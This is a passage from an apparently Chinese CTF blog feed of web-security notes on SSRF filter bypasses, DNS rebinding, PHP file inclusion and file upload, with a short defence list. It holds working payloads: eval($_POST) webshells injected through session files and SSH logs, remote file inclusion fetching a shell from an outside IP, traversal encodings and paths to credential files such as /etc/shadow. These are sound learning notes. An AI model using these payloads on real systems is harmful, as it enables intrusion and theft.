class="variable">$ip</span>[<span class="number">0</span>] &lt;&lt; <span class="number">24</span>) | (<span class="variable">$ip</span>[<span class="number">1</span>] &lt;&lt; <span class="number">16</span>) | (<span class="variable">$ip</span>[<span class="number">2</span>] &lt;&lt; <span class="number">8</span>) | <span class="variable">$ip</span>[<span class="number">3</span>] ;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$r</span> &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="variable">$r</span> += <span class="number">4294967296</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;十进制:&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$r</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;八进制:&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">decoct</span>(<span class="variable">$r</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;十六进制:&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">dechex</span>(<span class="variable">$r</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>利用其他各种指向127.0.0.1的地址</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/</span><br><span class="line">http://0/</span><br><span class="line">http://[0:0:0:0:0:ffff:127.0.0.1]/</span><br><span class="line">http://①②⑦.⓪.⓪.①</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Enclosed alphanumerics</span><br><span class="line">List:</span><br><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ </span><br><span class="line">⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ </span><br><span class="line">⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ </span><br><span class="line">⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ </span><br><span class="line">Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ </span><br><span class="line">ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ </span><br><span class="line">⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ </span><br><span class="line">⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure></div><h3 id="302跳转-Bypass"><a href="#302跳转-Bypass" class="headerlink" title="302跳转 Bypass"></a>302跳转 Bypass</h3><p>访问<code>http://xip.io</code>的子域名，例如<code>http://192.168.0.1.xip.io</code>，会自动重定向到<code>http://192.168.0.1</code></p><p>上述方法包含了<code>192.168.0.1</code>内网IP地址，可能会被正则表达式过滤掉。可以通过短地址方式来绕过。<a class="link"   href="https://tinyurl.com/app" >TINYURL <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?url=http://0.xip.io/flag.php</span><br><span class="line">?url=http://localhost.xip.io/flag.php</span><br></pre></td></tr></table></figure></div><blockquote><p>127.0.0.1被过滤了。可以将127.0.0.1用<code>0</code>或<code>localhost</code>等代替</p></blockquote><p>这题用短链接成功过</p><p>使用<a class="link"   href="https://tinyurl.com/app/myurls" >TINYURL <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，在Your Long URL处输入<code>http://127.0.0.1/flag.php</code>，生成短网址</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=https://tinyurl.com/2p8s2csr</span><br></pre></td></tr></table></figure></div><h3 id="DNS重绑定Bypass"><a href="#DNS重绑定Bypass" class="headerlink" title="DNS重绑定Bypass"></a>DNS重绑定Bypass</h3><p><a class="link"   href="https://www.freebuf.com/articles/web/135342.html" >SSRF漏洞中绕过IP限制的几种方法总结 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link"   href="https://zhuanlan.zhihu.com/p/89426041" >浅谈DNS重绑定漏洞 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>[基于DNS重绑定的绕过](<a class="link"   href="https://github.com/incredibleindishell/SSRF_Vulnerable_Lab/tree/master/DNS" >https://github.com/incredibleindishell/SSRF_Vulnerable_Lab/tree/master/DNS <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> Rebinding based Bypass)</p><p><strong>DNS Rebinding</strong>(be like一些替身梗)</p><p>在网页浏览过程中，用户在地址栏中输入包含域名的网址。浏览器通过DNS服务器将域名解析为IP地址，然后向对应的IP地址请求资源，最后展现给用户。而对于域名所有者，他可以<u>设置域名所对应的IP地址</u>。当用户第一次访问，解析域名获取一个IP地址(事先设置为白名单中的IP地址)；然后，域名持有者修改对应的IP地址(比如内网127.0.0.1)；用户再次请求该域名，就会获取一个新的IP地址。对于浏览器来说，整个过程访问的都是同一域名，所以认为是安全的(同源策略)。这就造成了DNS Rebinding攻击。</p><blockquote><p>同源策略:<strong>如果两个页面的协议，端口（如果有指定）和域名都相同，则两个页面具有相同的源</strong></p></blockquote><p><strong>实现攻击的两种方法：</strong></p><p>攻击者将子域绑定到两个不同的IP。</p><p>攻击者设置一个DNS服务器，TTL很短。该DNS服务器返回的指定域名的解析结果，在两个IP之间不断切换。</p><p>网站设置DNS：<a class="link"   href="https://lock.cmpxchg8b.com/rebinder.html" >https://lock.cmpxchg8b.com/rebinder.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>这个网站会随机指向两个绑定地址的其中一个</p><p>Payload:</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=7f000001.c0a80001.rbndr.us/flag.php</span><br></pre></td></tr></table></figure></div><p><strong>DNS记录的生存时间（TTL）</strong></p><p>DNS服务器如果将TTL设置为0，Web服务器就不会对指定域名解析的IP进行缓存。</p><p>此特性将有助于绕过代码中的安全检查。应用程序具有两个不同的代码部分：</p><blockquote><p>第一部分代码用于检查域&#x2F;该域解析的IP是否在黑名单中。如果在黑名单中，则应用程序将停止进一步处理。</p><p>一旦IP&#x2F;域通过了安全检查，第二部分代码会从指定URL中获取内容。</p></blockquote><p>这样，Web服务器对域名进行黑名单检查时，会向DNS服务发起第一次请求，DNS服务器返回一个合法的IP地址，绕过了黑名单检测。因为DNS服务器的TTL设置为0，Web服务器使用<code>get_contents()</code>加载指定URL的文件内容时，会再次向DNS服务器请求解析该域名，而这次DNS服务器会返回一个内网地址，从而成功的读取内网文件。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含</title>
      <link href="/2022/03/07/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
      <url>/2022/03/07/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
      
        <content type="html"><![CDATA[<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="0x01-简介及基本知识"><a href="#0x01-简介及基本知识" class="headerlink" title="0x01 简介及基本知识"></a>0x01 简介及基本知识</h2><p>攻击方绕过了文件包含函数的参数过滤或限制，从而包含恶意文件，达到执行非预期代码的目的。</p><h3 id="文件包含函数"><a href="#文件包含函数" class="headerlink" title="文件包含函数"></a>文件包含函数</h3><p>PHP中文件包含函数有以下四种：</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span>()</span><br><span class="line"><span class="keyword">require_once</span>()</span><br><span class="line"><span class="keyword">include</span>()</span><br><span class="line"><span class="keyword">include_once</span>()</span><br></pre></td></tr></table></figure></div><blockquote><ul><li><code>include</code>和<code>require</code>区别主要是，<code>include</code>在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而<code>require</code>函数出现错误的时候，会直接报错并退出程序的执行。</li><li><code>include_once()</code>，<code>require_once()</code>这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。</li><li>当利用这四大漏洞函数包含文件的时候，不论什么类型的文件，都会作为PHP脚本解析</li></ul></blockquote><h3 id="敏感信息路径"><a href="#敏感信息路径" class="headerlink" title="敏感信息路径"></a>敏感信息路径</h3><p>Windows系统</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c:\boot.ini <span class="comment">// 查看系统版本</span></span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml <span class="comment">// IIS配置文件</span></span><br><span class="line">c:\windows\repair\sam <span class="comment">// 存储Windows系统初次安装的密码</span></span><br><span class="line">c:\ProgramFiles\mysql\my.ini <span class="comment">// MySQL配置</span></span><br><span class="line">c:\ProgramFiles\mysql\data\mysql\user.MYD <span class="comment">// MySQL root密码</span></span><br><span class="line">c:\windows\php.ini <span class="comment">// php 配置信息</span></span><br></pre></td></tr></table></figure></div><p>Linux&#x2F;Unix系统</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd <span class="comment">// 账户信息</span></span><br><span class="line">/etc/shadow <span class="comment">// 账户密码文件</span></span><br><span class="line">/usr/local/app/apache2/conf/httpd.conf <span class="comment">// Apache2默认配置文件</span></span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhost.conf <span class="comment">// 虚拟网站配置</span></span><br><span class="line">/usr/local/app/php5/lib/php.ini <span class="comment">// PHP相关配置</span></span><br><span class="line">/etc/httpd/conf/httpd.conf <span class="comment">// Apache配置文件</span></span><br><span class="line">/etc/my.conf <span class="comment">// mysql 配置文件</span></span><br></pre></td></tr></table></figure></div><h1 id="0x02-常见Bypass"><a href="#0x02-常见Bypass" class="headerlink" title="0x02 常见Bypass"></a>0x02 常见Bypass</h1><h2 id="session文件包含漏洞"><a href="#session文件包含漏洞" class="headerlink" title="session文件包含漏洞"></a>session文件包含漏洞</h2><h3 id="条件："><a href="#条件：" class="headerlink" title="条件："></a>条件：</h3><p>可获取session存储位置</p><h3 id="方式："><a href="#方式：" class="headerlink" title="方式："></a>方式：</h3><ol><li><p>phpinfo中<code>session.save_path</code></p><blockquote><p>第二列是<code>Local Value</code>（局部变量），第三列是<code>Master Value</code>（主变量）。其中<code>Master Value</code>是PHP.ini文件中的内容。<code>Local value</code>是当前目录中的设置，这个值会覆盖<code>Master Value</code>中对应的值。</p></blockquote></li><li><p>猜测默认路径以及常见路径</p><ul><li>linux下默认存储在&#x2F;var&#x2F;lib&#x2F;php&#x2F;session</li><li><code>/var/lib/php/sess_PHPSESSID</code></li><li><code>/var/lib/php/sess_PHPSESSID</code></li><li><code>/tmp/sess_PHPSESSID</code></li><li><code>/tmp/sessions/sess_PHPSESSID</code></li></ul></li></ol><p>session可控</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$ctfs</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctfs&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>]=<span class="variable">$ctfs</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>session的文件名为sess_+sessionid，sessionid可以通过开发者模式获取(一般是cookie中的PHPSESSID的值)</p><p>单击右键——检查——存储——Cookie——PHPSESSID 就可以找到内容</p><blockquote><p>假设以上代码传参数ctfs&#x3D;test,则session文件内容为</p><p><code>username|s:4:&quot;test&quot;</code></p></blockquote><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>通过可控参数写入恶意代码到session文件，然后通过文件包含漏洞执行此恶意代码getshell</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//传马</span></span><br><span class="line">session.php?ctfs=<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//也可以写马</span></span><br><span class="line">session.php?ctfs=<span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;data2.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php eval($_POST[123])?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//利用文件包含漏洞解析该session文件</span></span><br><span class="line">file.php?file=sess_83317220159fc31cd7023422f64bea1a</span><br></pre></td></tr></table></figure></div><h3 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a><strong>攻击步骤</strong></h3><ul><li>将恶意代码写入session文件</li><li>攻击者可以通过PHPinfo或者猜测到session存放的位置</li><li>通过开发者模式可以获得文件名称</li><li>通过本地文件包含漏洞可以解析session文件达到攻击的目的</li></ul><h2 id="00截断文件包含"><a href="#00截断文件包含" class="headerlink" title="%00截断文件包含"></a>%00截断文件包含</h2><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><ul><li>magic_quotes_gpc&#x3D;off</li><li>PHP版本低于5.3.4(5.3.29复现失败,5.2.17成功 建议MAMP pro版本不要超过6.3.2)</li></ul><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>截断的核心，就是 <code>chr(0)</code>这个字符。先说一下这个字符，这个字符不为空 <code>(Null)</code>，也不是空字符 <code>(&quot;&quot;)</code>，更不是空格。 当程序在输出含有 <code>chr(0)</code>变量时 <code>chr(0)</code>后面的数据会被停止，换句话说，就是误把它当成结束符，后面的数据直接忽略，这就导致漏洞产生。</p><h3 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h3><p>包含时，给文件名拼接上其余后缀，从而限制了读取文件的类型范围</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span> (<span class="variable">$file</span>.<span class="string">&quot;.html&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><blockquote><p><code>file.php?file=../../../../../../boot.ini%00</code></p><p>%00截断后面”.html”内容，实际上包含boot.ini</p></blockquote><h2 id="路径长度截断文件包含"><a href="#路径长度截断文件包含" class="headerlink" title="路径长度截断文件包含"></a>路径长度截断文件包含</h2><p>可以输入超过最大路劲长度的目录，这样系统就会将后面的路径丢弃，导致拓展名截断</p><h3 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h3><ul><li>Windows下最大路径长度为256B</li><li>Linux下最大路径长度为4096B(浏览器最多只能输入300多个字符，所以需要抓包)</li></ul><p>文件名后叠加<code>./</code> 不过不能超过此服务器的容量限制</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file.php?file=test.txt/./....././</span><br></pre></td></tr></table></figure></div><h2 id="日志文件包含"><a href="#日志文件包含" class="headerlink" title="日志文件包含"></a>日志文件包含</h2><p>典型的日志文件包含：</p><ul><li>中间件日志文件包含</li><li>ssh日志文件包含</li></ul><h3 id="中间件日志文件包含"><a href="#中间件日志文件包含" class="headerlink" title="中间件日志文件包含"></a>中间件日志文件包含</h3><p>利用条件：</p><ul><li>web中间件日志文件的存储位置已知，并且具有可读权限</li></ul><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>由于访问网站下其他文件，不论是否访问成功，都会被写入日志文件，因此可以直接访问一句话木马，如</p><ul><li>访问 <code>http://www.abc.com/xxx/&lt;?php @eval($_POST[123]);?&gt;</code></li><li>日志文件记录 <code>192.168.1.200 - - [09/Aug/2021:19:35:23 +0800] &quot;GET /xxx/%3C?php @eval($_POST[123]);?%3E HTTP/1.1&quot; 404 826....</code></li></ul><blockquote><p>浏览器进行了URL编码，导致传入的代码不能正常使用<strong>可以通过bp抓包的方式写入恶意代码，这样不会被编码</strong></p><p>Apache的中间件日志文件存在&#x2F;var&#x2F;log&#x2F;httpd&#x2F;目录下，文件名叫access_log</p></blockquote><h3 id="ssh日志文件包含"><a href="#ssh日志文件包含" class="headerlink" title="ssh日志文件包含"></a>ssh日志文件包含</h3><p>SSH日志文件包含的利用条件是：</p><ul><li>SSH日志路径已知，并且具有可读权限</li></ul><p>SSH日志文件的默认路径为<code>/var/log/auth.log</code></p><h4 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h4><p>ssh连接时将用户名设为恶意代码，写入成功后再包含即可</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh &quot;&lt;?php @eval($_POST[123]);?&gt;&quot;@192.168.1.1</span><br></pre></td></tr></table></figure></div><h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><h3 id="无限制远程文件包含"><a href="#无限制远程文件包含" class="headerlink" title="无限制远程文件包含"></a>无限制远程文件包含</h3><p>通过URL的形式包含到其他服务器上的文件，以及执行文件中的恶意代码</p><p>条件</p><div class="highlight-container" data-rel="Ini"><figure class="iseeu highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">allow_url_fopen</span>=<span class="literal">on</span></span><br><span class="line"><span class="attr">allow_url_include</span>=<span class="literal">on</span></span><br></pre></td></tr></table></figure></div><p>payload <code>http://www.abc.com/file.php?file=http://192.168.2.1/shell.php</code></p><h3 id="有限制的远程文件包含"><a href="#有限制的远程文件包含" class="headerlink" title="有限制的远程文件包含"></a>有限制的远程文件包含</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>].<span class="string">&quot;.html&quot;</span>);</span><br></pre></td></tr></table></figure></div><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><ul><li><p>可以在问号后面添加html字符串，问号后面的拓展名会被当做查询，从而绕过过滤<br><code>file.php?filename=http://192.168.2.1/shell.php?</code></p></li><li><p>可以在#后面添加HTML字符串，#会截断后面的拓展名，从而绕过拓展名过滤.#的URL编码为%23</p><p><code>file.php?filename=http://192.168.2.1/shell.php%23</code></p></li><li><p>空格绕过</p></li></ul><p>​<code>file.php?filename=http://192.168.2.1/php.txt%20</code></p><h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><p>详见php伪协议学习笔记</p><h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><p>服务器端常常会对于..&#x2F;等做一些过滤，可以用一些编码来进行绕过。<br><strong>1.利用url编码</strong></p><ul><li>..&#x2F;<ul><li>%2e%2e%2f</li><li>..%2f</li><li>%2e%2e&#x2F;</li></ul></li><li>..\<ul><li>%2e%2e%5c</li><li>..%5c</li><li>%2e%2e\</li></ul></li></ul><p><strong>2.二次编码</strong></p><ul><li>..&#x2F;<ul><li>%252e%252e%252f</li></ul></li><li>..\<ul><li>%252e%252e%255c</li></ul></li></ul><p><strong>3.容器&#x2F;服务器的编码方式</strong></p><ul><li>..&#x2F;<ul><li>..%c0%af<ul><li>注：<a class="link"   href="https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work" >Why does Directory traversal attack %C0%AF work? <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul></li><li>%c0%ae%c0%ae&#x2F;<ul><li>注：java中会把”%c0%ae”解析为”\uC0AE”，最后转义为ASCCII字符的”.”（点）</li><li>Apache Tomcat Directory Traversal(Apache Tomcat 目录遍历)</li></ul></li></ul></li><li>..\<ul><li>..%c1%9c</li></ul></li></ul><h2 id="遇到指定后缀的情况"><a href="#遇到指定后缀的情况" class="headerlink" title="遇到指定后缀的情况"></a>遇到指定后缀的情况</h2><p>接着考虑指定后缀的情况。测试代码:</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$file</span>.<span class="string">&#x27;/test/test.php&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="解决：URL"><a href="#解决：URL" class="headerlink" title="解决：URL"></a><strong>解决：URL</strong></h3><p>url格式</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protocol://hostname[:port]/path/[;parameters][?query]#fragment</span><br></pre></td></tr></table></figure></div><p>在远程文件包含漏洞（RFI）中，可以利用query（?）或fragment（#）来绕过后缀限制。那么利用条件就需要是：</p><ol><li><code>allow_url_fopen = On</code></li><li><code>allow_url_include = On</code></li></ol><h3 id="姿势一：query（-）"><a href="#姿势一：query（-）" class="headerlink" title="姿势一：query（?）"></a><strong>姿势一：query（?）</strong></h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=http://remoteaddr/remoteinfo.txt?</span><br></pre></td></tr></table></figure></div><p>则包含的文件为 <code>http://remoteaddr/remoteinfo.txt?/test/test.php</code><br>问号后面的部分<code>/test/test.php</code>，也就是指定的后缀被当作query从而被绕过。</p><h3 id="姿势二：fragment（-23-）"><a href="#姿势二：fragment（-23-）" class="headerlink" title="姿势二：fragment（#(%23)）"></a><strong>姿势二：fragment（#(%23)）</strong></h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=http://remoteaddr/remoteinfo.txt%23</span><br></pre></td></tr></table></figure></div><p>则包含的文件为 <code>http://remoteaddr/remoteinfo.txt#/test/test.php</code><br>问号后面的部分<code>/test/test.php</code>，也就是指定的后缀被当作fragment从而被绕过。注意需要把<code>#</code>进行url编码为<code>%23</code>。</p><h2 id="防御方案"><a href="#防御方案" class="headerlink" title="防御方案"></a>防御方案</h2><ol><li>在很多场景中都需要去包含web目录之外的文件，如果php配置了<code>open_basedir</code>，则会包含失败。所以PHP 中使用<code>open_basedir</code>配置限制访问在指定的区域。</li><li>做好文件的权限管理。</li><li>对可以包含的文件进行限制，可以采用白名单的方式，或设置可以包含的目录。</li><li>对危险字符进行过滤，比如过滤<code>.</code>（点）<code>/</code>（反斜杠）<code>\</code>（反斜杠）等特殊字符。</li><li>尽量将allow_url_fopen和allow_url_include配置为off，不过像有些伪协议还是能使用，不过能尽量off还是off吧。</li><li>尽量不使用动态包含等等</li></ol>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传</title>
      <link href="/2022/03/04/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2022/03/04/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><h3 id="文件上传漏洞的由来"><a href="#文件上传漏洞的由来" class="headerlink" title="文件上传漏洞的由来"></a>文件上传漏洞的由来</h3><p>通过客户端的POST请求上传文件，由于消息主体就是一些上传信息。前端上传页面需要指定 enctype 为 multipart&#x2F;form-data 或者 Multipart&#x2F;form-data 才能正常上传文件。</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&#x27;&#x27;</span> <span class="attr">enctype</span>=<span class="string">&#x27;multipart/form-data&#x27;</span> <span class="attr">method</span>=<span class="string">&#x27;POST&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;file&#x27;</span> <span class="attr">name</span>=<span class="string">&#x27;file&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure></div><blockquote><p>multipart 格式的数据会将一个表单拆分为多个部分（part），每个部分对应一个输入域。在一般的表单输入域中，<br>它所对应的部分中会放置文本型数据，但是如果上传文件的话，它所对应的部分可以是二进制，下面展现了 multipart 的请求体：</p></blockquote><p>filename 字段是必要的，指定了<u>上传时的那个文件的文件名</u>。其他的可有可无</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Content-Type:multipart/form-data; boundary=----WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;text&quot;</span><br><span class="line"></span><br><span class="line">title</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;chrome.png&quot;</span><br><span class="line"></span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">PNG ... content of chrome.png ...</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryrGKCBY7qhFd3TrwA--</span><br></pre></td></tr></table></figure></div><p>这里在每个字段之间使用 